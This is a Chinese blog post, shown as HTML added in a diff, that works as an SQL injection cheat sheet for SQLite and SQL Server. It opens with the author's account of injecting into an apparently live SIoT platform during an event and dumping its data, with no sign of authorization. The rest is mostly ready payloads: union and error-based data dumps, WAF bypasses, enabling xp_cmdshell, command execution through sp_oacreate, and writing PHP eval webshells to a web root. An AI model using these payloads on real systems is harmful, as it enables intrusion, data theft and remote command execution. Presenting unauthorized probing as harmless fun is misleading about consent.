@@ -1,0 +1,424 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>各种数据库类型sql注入 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>各种数据库类型sql注入</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-05T11:04:17.000Z" id="date"> 2023-07-05</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-06T10:53:26.927Z" id="updated"> 2023-07-06</time></div></span></div></div><hr><div id="post-content"><p>在一个不偶然的机遇之下，接触到了siot平台，无聊之下，发现了一个一个sql注入的漏洞，同时引出了今天的文章</p>
+<span id="more"></span>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一次无聊的婴幼儿性质的科技活动，本人被迫参加。</p>
+<p>今天上午的在活动中摸鱼的时候，偶然一瞥发现了一个类似留言板的搜索框，心想闲着没事，正好sql注入玩玩😁</p>
+<h1 id="注入历程"><a href="#注入历程" class="headerlink" title="注入历程"></a>注入历程</h1><p>因为当时人比较多还是摸鱼的怕被发现，没有记录太多，只是保留了一些珍贵的图像以及当时的注入语句，这里简单叙述一下</p>
+<ol>
+<li><p>单引号闭合弹错误消息，双引号闭合不报错，判断出是单引号闭合</p>
+</li>
+<li><p>猜测是post提交“#”闭合无效，尝试”–+“成功（原因后面会说），判断出闭合是单引号</p>
+</li>
+<li><p>order by判断字段数是5</p>
+</li>
+<li><p>union select 联合查询注出回显点为1，2，4<br class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/1.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/1.png"><br> （珍贵图像之一)</p>
+</li>
+<li><p>尝试获取基本信息</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select database(),2,3,4,5<br></code></pre></td></tr></table></figure>
+
+<p> 报错，怀疑过滤，用上了bypass waf的注释依旧不行，尝试把database换成version user均失败</p>
+<p> 没关系可能这一步被全部过滤了，直接构造下一步的语句</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">union select group_concat(table_name) from information_schema.tables where table_schema.tables=database()<br></code></pre></td></tr></table></figure>
+
+<p> 依旧报错</p>
+</li>
+<li><p>此时意识到应该数据库类型不知MySQL，超出了知识范围</p>
+<p> 查阅siot官方文档，发现数据库类型是sqlite</p>
+<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/2.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/2.png"></p>
+<p> 验证了一下，确实是sqlite数据库：</p>
+<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/3.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/3.png"></p>
+<p> 然后随便找了一个sqlite的注入语句（毕竟当时管不了什么多的了，先注出来要紧）</p>
+</li>
+<li><p>一步获取表名以及列名</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">&#x27; union select (select group_concat(sql) from sqlite_master),2,3,4,5 --+<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/4.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/4.png"></p>
+<p> （我自己都不信我当时有时间把图接下来还用两种颜色的荧光笔标出来表名和列名）</p>
+<p> ok到了这一步就差不多了</p>
+</li>
+<li><p>最后一步</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">&#x27; union select (select group_concat(Description) from Project),2,3,4,5 --+<br></code></pre></td></tr></table></figure>
+
+<p> 因为当时域服务器马上就要关了，有点着急，没有获取全部的列名就随便挑了一个</p>
+<p class='item-img' data-src='/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/5.png'><img src="/pic/%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/5.png"><br> （真是一个认真的描述！)</p>
+<p> 到此结束</p>
+</li>
+</ol>
+<h1 id="复盘反思"><a href="#复盘反思" class="headerlink" title="复盘反思"></a>复盘反思</h1><p>这一次的注入主要卡在了数据库注入语句的问题，因此今天这篇文章就来梳理一下主要的数据库类型的注入语句</p>
+<p>目前主流的是这些：</p>
+<ul>
+<li><p>sqlite </p>
+</li>
+<li><p>PostgreSQL</p>
+</li>
+<li><p>sql server </p>
+</li>
+<li><p>orancle </p>
+</li>
+<li><p>mongoDB</p>
+</li>
+<li><p>redis </p>
+</li>
+<li><p>cassandra</p>
+</li>
+<li><p>couchDB</p>
+</li>
+<li><p>MariaDB</p>
+</li>
+<li><p>mysql</p>
+</li>
+</ul>
+<p>目前最最主流的就是MySQL，已经会了，这里不作叙述，今天主要挑选sqlite、sql server、orancle 、PostgreSQL这几个展开</p>
+<p>分别从基础注入语句以及getshell两方面记录,当然此文章并不会深入探讨，在实战中还是使用sqlmap更加高效一些</p>
+<h1 id="Sqlite"><a href="#Sqlite" class="headerlink" title="Sqlite"></a>Sqlite</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/HBohan/article/details/120672745">https://blog.csdn.net/HBohan/article/details/120672745</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627">https://xz.aliyun.com/t/8627</a></p>
+</blockquote>
+<p>这个注入与mysql最像，因此先从这个开始，我们从最基本的步骤来记录</p>
+<p>为了研究，我将siot本地平台搭建在了虚拟机上方便研究</p>
+<h2 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h2><p>利用此数据库语言的特有函数：sqlite_version()</p>
+<h2 id="基本注入"><a href="#基本注入" class="headerlink" title="基本注入"></a>基本注入</h2><ol>
+<li><p>判断闭合 </p>
+<p>同MySQL 注释符为“–+” 或者也可以使用“&#x2F;*” 不可使用“#” 有时候可以使用“;” </p>
+</li>
+<li><p>获取字段数 同MySQL</p>
+</li>
+<li><p>判断回显点 同MySQL</p>
+</li>
+<li><p>获取表名、列名</p>
+<p>不同于MySQL的是，这只需要一步就可以得出了，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; union select group_concat(sql),2,3,4,5 from sqlite_master --+<br></code></pre></td></tr></table></figure>
+
+<p>这个语句执行后会回显出创建表的语句，以达到获取表名和列名的效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">CREATE TABLE &quot;Project&quot; ( &quot;ID&quot; text(80,0) NOT NULL, &quot;Description&quot; text(200,0), &quot;Created&quot; integer(11,0) NOT NULL, PRIMARY KEY(&quot;ID&quot;) ),CREATE TABLE &quot;Device&quot; ( &quot;ProjectID&quot; text(80,0) NOT NULL, &quot;DeviceName&quot; text(100,0) NOT NULL, &quot;Created&quot; int(11,0) NOT NULL, &quot;DeviceDesc&quot; text(200,0), &quot;ID&quot; text(70,0) NOT NULL, PRIMARY KEY(&quot;ID&quot;) ),CREATE TABLE &quot;Message&quot; ( &quot;Topic&quot; text(80,0) NOT NULL, &quot;Content&quot; text(200,0), &quot;Created&quot; integer(11,0) NOT NULL, &quot;ID&quot; INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT ),CREATE TABLE sqlite_sequence(name,seq),CREATE INDEX &quot;&quot; ON Message (&quot;Created&quot; COLLATE NOCASE DESC)<br></code></pre></td></tr></table></figure>
+
+<p>看着有点乱，但是应该都是可以判断出来的</p>
+</li>
+<li><p>获取全部内容</p>
+<p>一上面的内容举例，我们构造的语句和mysql的语句差不多：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27; union select group_concat(ID,Description),2,3,4,5 from Project/*<br></code></pre></td></tr></table></figure>
+
+<p>有一点需要注意，上面的Project表中还含有一个“Created”的列名，他的类型是int，不能和text类型的数据一起放在group_concat里面来输出</p>
+</li>
+</ol>
+<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#x27;;ATTACH DATABASE &#x27;C:\\Users\\Big_Clever\\Desktop\\SIoT1.2\\static\\shell.php&#x27; AS shell;<br>create TABLE shell.exp (payload text); <br>insert INTO shell.exp (payload) VALUES (&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;) <br>--+<br></code></pre></td></tr></table></figure>
+
+<p>如果后台的查询语句是query()就不能使用这个语句了</p>
+<p>如果使用的是exec()就可以使用，也就有了堆叠注入，有了更大的操作空间</p>
+<p>当然，要获取绝对路径就只能看自己的运气和造诣了，常见的是通过制造报错和获取网站的phpinfo.php</p>
+<p>sqlite就粗略的到这里吧，后面的拓展随缘记录</p>
+<h1 id="Sql-Server"><a href="#Sql-Server" class="headerlink" title="Sql Server"></a>Sql Server</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42990434/article/details/111287071">https://blog.csdn.net/qq_42990434/article/details/111287071</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LJH1999ZN/article/details/122911809">https://blog.csdn.net/LJH1999ZN/article/details/122911809</a></p>
+<p><a target="_blank" rel="noopener" href="https://payloads.online/article/417aef69-1622-4985-8690-09504bfd40cd">https://payloads.online/article/417aef69-1622-4985-8690-09504bfd40cd</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zzgslh/article/details/111695332">https://blog.csdn.net/zzgslh/article/details/111695332</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8603">https://xz.aliyun.com/t/8603</a></p>
+</blockquote>
+<h2 id="判断方法-1"><a href="#判断方法-1" class="headerlink" title="判断方法"></a>判断方法</h2><p>忘记哪一个文章里面有一个师傅说看见页面大部分的文件都是.asp .aspx就可以大致判定数据库类型是sql server了，但是这个总结确实非常准确精辟</p>
+<h2 id="基本注入-1"><a href="#基本注入-1" class="headerlink" title="基本注入"></a>基本注入</h2><p>首先简单看看一些常用的语句和函数吧</p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><ul>
+<li><p>@@version &#x2F;&#x2F; 数据库版本</p>
+</li>
+<li><p>system_user &#x2F;&#x2F;系统用户名</p>
+</li>
+<li><p>suser_sname() &#x2F;&#x2F;查出当前操作数据库的登入名，一般和触发器一起用来监控是谁对表做了操作</p>
+</li>
+<li><p>user &#x2F;&#x2F;获取当前数据库用户名</p>
+</li>
+<li><p>db_name() &#x2F;&#x2F; 当前数据库名 其中db_name(N)可以来遍历其他数据库</p>
+</li>
+<li><p>db_name(7) &#x2F;&#x2F;查询库名，1-6为系统库，7开始为其他库</p>
+</li>
+<li><p>select host_name())&#x2F;&#x2F;主机名</p>
+</li>
+<li><p>;select user &#x2F;&#x2F;查询是否支持多语句(堆叠注入)</p>
+</li>
+<li><p>select is_srvrolemember(‘sysadmin’) &#x2F;&#x2F;判断是否是系统管理员，0就是false</p>
+</li>
+<li><p>select is_srvrolemember(‘db_owner’) &#x2F;&#x2F;判断是否是库权限，0就是false</p>
+</li>
+<li><p>select is_srvrolemember(‘public’) &#x2F;&#x2F;判断是否为public权限，0就是false</p>
+</li>
+<li><p>select count(*) from master.dbo.sysobjects where xtype&#x3D;’X’ and name&#x3D;’xp_cmdshell’ &#x2F;&#x2F;查询xp_cmdshell，1为存在</p>
+</li>
+<li><p>select name from master.dbo.sysdatabases where dbid&#x3D;7 &#x2F;&#x2F;修改dbid数值，查询库名，1-6为系统库</p>
+<hr>
+<p>这两条仅限于&gt;&#x3D;2005的版本</p>
+</li>
+<li><p>select quotename(name) from master…sysdatabases FOR XML PATH(‘’)</p>
+</li>
+<li><p>select ‘|’%2bname%2b’|’ from master…sysdatabases FOR XML PATH(‘’)</p>
+<hr>
+</li>
+</ul>
+<p>因为没有环境测试，暂时没有实操语句，之后遇到了再记录，这里再简单写一些bypass手法（其实就是文章里面的）</p>
+<p><strong>绕过方式：</strong><br>mssql空白符，%01-%20都为空白符，–和&#x2F;**&#x2F;为注释，%00也可充当注释符</p>
+<p>引进一个declare 函数，他是mssql声明局部变量的函数，我们经常用它来绕过waf对一些关键词的拦截</p>
+<p>select * from admin where id &#x3D;1;declare @a nvarchar(2000) set @a&#x3D;‘select convert(int,@@version)’ exec(@a) –<br>堆叠注入，使用declare 和exec进行无select注入</p>
+<p>declare @s varchar(2000) set @s&#x3D;0x73656C6563742031 exec(@s)<br>declare定义变量 set设置变量值 exec执行变量</p>
+<p>变量的值是支持hex和ascii码的,当过滤引号我们就可以这么用</p>
+<p>避免使用引号</p>
+<p>(select top 1 name from syscolumns where id&#x3D;object_id(‘admin’))</p>
+<p>(select top 1 name from syscolumns where id&#x3D;object_id(char(97)+char(100)+char(109)+char(105)+char(110)))</p>
+<hr>
+<p>现在开始正式的注入步骤记录</p>
+<ol>
+<li><p>判断闭合 注释符为–+ 同MySQL</p>
+</li>
+<li><p>判断字段数 同MySQL</p>
+</li>
+<li><p>注出回显点 同MySQL</p>
+</li>
+<li><p>查询数据库</p>
+<p>这里需要先确认每一列的数据类型，将<code>union select 1,2,3</code>替换成<code>union all select null,null,null</code> 添加all是为了不让程序自动去重</p>
+<p>这一步需要枚举出每一列的数据类型，假如我们此时枚举出后的payload是：<code>union all select 1,null,null</code> 那么我们就可以把需要查询的东西放到”null“位上</p>
+<ol>
+<li><p>查询全部数据库（a.b.两步均为数字型注入下，如果是字符型注入需要闭合加上注释）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">UNION all SELECT 1,null,name from master..sysdatabases<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询当前数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">UNION all SELECT 1,2,db_name() from master..sysdatabases<br></code></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><p>获取数据库中的表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">UNION all SELECT 1,2,name from 数据库名称..sysobjects where xtype = 0x75 <br></code></pre></td></tr></table></figure>
+
+<p>0x75对应的是字符“u”</p>
+</li>
+<li><p>获取当前表名的列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mssql">   UNION all SELECT 1,2,name from jiaofan..syscolumns where id = (select id from 数据库名称..sysobjects where name = 表名)<br>   ````<br><br>7. 获取全部内容<br><br>   ```mssql<br>   UNION all SELECT 1,2,列名 from  表名<br></code></pre></td></tr></table></figure></li>
+</ol>
+<hr>
+<p>一套流程下来，和MySQL差不多，可见数据库语言都是触类旁通的</p>
+<p>接下来介绍一下sqlserver报错注入</p>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>以下语句均为字符型注入下，并给出多个payload</p>
+<ol>
+<li><p>获取当前数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and 1=(select db_name())<br><br>and 1=convert(int,(select db_name()))<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库中的表名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and 1= (select top 1 name from 数据库名..sysobjects where xtype = 0x75) <br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,(select top 1 name from 数据库名.sys.objects where type=&#x27;U&#x27;))<br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,stuff((select  quotename(name) from 数据库名.sys.objects where type=&#x27;U&#x27; for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))<br>此语句获取数据库下的全部表<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取表中的列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and 1=(select top 1 c.name from 数据库名..syscolumns c ,数据库名..sysobjects o where c.id = o.id and o.name=表名) <br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,(select top 1 name from 数据库名.sys.columns where object_id=object_id(&#x27;表名&#x27;)))<br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,stuff((select quotename(name) from 数据库名.sys.columns where object_id=object_id(&#x27;表名&#x27;) for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))<br>此语句获取表中的全部列<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>dump全部内容 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mssql">and 1=convert(int,(select top 1 列名 from 表名))<br>注：使用此语句需要修改top后的数字<br><br>and 1=convert(int,stuff((select quotename(列名) from 表名 for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))<br>此语句dump全部内容<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="GetShell-1"><a href="#GetShell-1" class="headerlink" title="GetShell"></a>GetShell</h2><h3 id="堆叠注入下getshell"><a href="#堆叠注入下getshell" class="headerlink" title="堆叠注入下getshell"></a>堆叠注入下getshell</h3><h4 id="直接通过特殊函数-getshell"><a href="#直接通过特殊函数-getshell" class="headerlink" title="直接通过特殊函数 getshell"></a>直接通过特殊函数 getshell</h4><p>一、<strong>xp_cmdshell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;<br></code></pre></td></tr></table></figure>
+
+<p>如果开启成功了，那么就可以使用如下代码来执行cmd命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=1;use master;exec master..xp_cmdshell &quot;whoami&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>获取了shell之后可以使用这个命令来查找网站绝对路径</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">for %i in (c d e f g h i j k l m n o p q r s t u v w x v z) do @(dir/s/b %i:\F12看到的调用文件)<br></code></pre></td></tr></table></figure>
+
+<p>二、<strong>xp_dirtree</strong></p>
+<p>xp_dirtree有三个参数，</p>
+<ol>
+<li>要列的目录</li>
+<li>是否要列出子目录下的所有文件和文件夹，默认为0，如果不需要设置为1</li>
+<li>是否需要列出文件，默认为不列，如果需要列文件设置为1</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">xp_dirtree &#x27;c:\&#x27;, 1, 1      #列出当前目录下所有的文件和文件夹<br></code></pre></td></tr></table></figure>
+
+<p>通过堆叠注入建表，将输出插入表里，通过注入将表列出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">?id=1;create table dir(subdirectory varchar(255),depth int, filee int);insert into dir(subdirectory,depth,filee) exec xp_dirtree &#x27;c:\&#x27;,1,1<br></code></pre></td></tr></table></figure>
+
+<p>因为xp_dirtree输出是三个字段的所以要创建一个三个字段的表 ，字段名可以随便取</p>
+<p>三、<strong>xp_subdirs</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mssql">xp_subdirs &#x27;c:\&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>这个方法和上面的一样，缺点是不能列出文件</p>
+<hr>
+<p>以上仅是针对于sqlserver特殊函数的获取绝对路径方法，普遍通用的方法这里不展开叙述</p>
+<h4 id="间接通过vbs-getshell"><a href="#间接通过vbs-getshell" class="headerlink" title="间接通过vbs getshell"></a>间接通过vbs getshell</h4><p>一、<strong>sp_oacreate</strong></p>
+<p>*1.1</p>
+<p>通过堆叠注入开启sp_oacreate</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mssql">exec sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE<br>exec sp_configure &#x27;Ole Automation Procedures&#x27;,1;RECONFIGURE<br></code></pre></td></tr></table></figure>
+
+<p>成功后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mssql">declare @o int;<br>exec sp_oacreate &#x27;wscript.shell&#x27;,@o out;<br>exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;cmd /c mkdir c:\temp&#x27;;<br>exec sp_oamethod @o,&#x27;run&#x27;,null,&#x27;cmd /c &quot;net user&quot; &gt; c:\temp\user.txt&#x27;;<br>create table cmd_output (output text);<br>BULK INSERT cmd_output FROM &#x27;c:\temp\user.txt&#x27; WITH (FIELDTERMINATOR=&#x27;n&#x27;,ROWTERMINATOR = &#x27;nn&#x27;)      -- 括号里面两个参数是行和列的分隔符，随便写就行<br>select * from cmd_output<br></code></pre></td></tr></table></figure>
+
+<p>列出cmd_output得到命令结果</p>
+<p>如果这个命令执行成功，会返回0</p>
+<hr>
+<p>*1.2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mssql">declare @f int,@g int<br>exec sp_oacreate &#x27;Scripting.FileSystemObject&#x27;,@f output<br>EXEC SP_OAMETHOD @f,&#x27;CreateTextFile&#x27;,@f OUTPUT,&#x27;c:\inetpub\wwwroot\cmd.vbs&#x27;,1<br>EXEC sp_oamethod  @f,&#x27;WriteLine&#x27;,null,&#x27;Set objShell = CreateObject(&quot;Shell.Application&quot;)<br>objShell.ShellExecute &quot;cmd&quot;, &quot;cmd /c whoami&gt;c:\whoami.txt&quot;, &quot;&quot;, &quot;runas&quot;,1&#x27;<br>declare @o int<br><br>exec sp_oacreate &#x27;Shell.Application&#x27;, @o out<br>exec sp_oamethod @o, &#x27;ShellExecute&#x27;,null, &#x27;cmd.exe&#x27;,&#x27;cmd /c net user &gt;c:\test.txt&#x27;,&#x27;c:\windows\system32&#x27;,&#x27;&#x27;,&#x27;1&#x27;; --支持2005，不支持2008<br><br>exec sp_oamethod @o,&#x27;ShellExecute&#x27;,null,&#x27;c:\inetpub\wwwroot\cmd.vbs&#x27;, &#x27;&#x27;, &#x27;c:\&#x27;, &#x27;&#x27;, 0 --成功<br></code></pre></td></tr></table></figure>
+
+<p>然后和上面一样写入表里应该就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mssql">create table cmd_output (output text);<br>BULK INSERT cmd_output FROM &#x27;c:\whoami.txt&#x27; WITH (FIELDTERMINATOR=&#x27;n&#x27;,ROWTERMINATOR = &#x27;nn&#x27;)      -- 括号里面两个参数是行和列的分隔符，随便写就行<br>select * from cmd_output<br></code></pre></td></tr></table></figure>
+
+<p>然后最后一步写shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mssql">declare @f int,@g int<br>exec sp_oacreate &#x27;Scripting.FileSystemObject&#x27;,@f output<br>EXEC SP_OAMETHOD @f,&#x27;CreateTextFile&#x27;,@f OUTPUT,&#x27;c:\inetpub\wwwroot\shell.php&#x27;,1<br>EXEC sp_oamethod  @f,&#x27;WriteLine&#x27;,null,&#x27;&lt;?php @eval(POST[&#x27;cmd&#x27;])?&gt;&#x27;<br></code></pre></td></tr></table></figure>
+
+<h3 id="备份getshell"><a href="#备份getshell" class="headerlink" title="备份getshell"></a>备份getshell</h3><p><strong>需要知道绝对路径</strong></p>
+<p>testdb是当前数据库</p>
+<p>网上查到两种方法，一种是差异备份一种是log备份</p>
+<p>差异备份2005和2008均没有复现成功</p>
+<p>05会一直报少一个%&gt;标记，08会多一个&lt;%然后报错，如果有解决的大佬希望可以告知一下，提前感谢</p>
+<p>log备份</p>
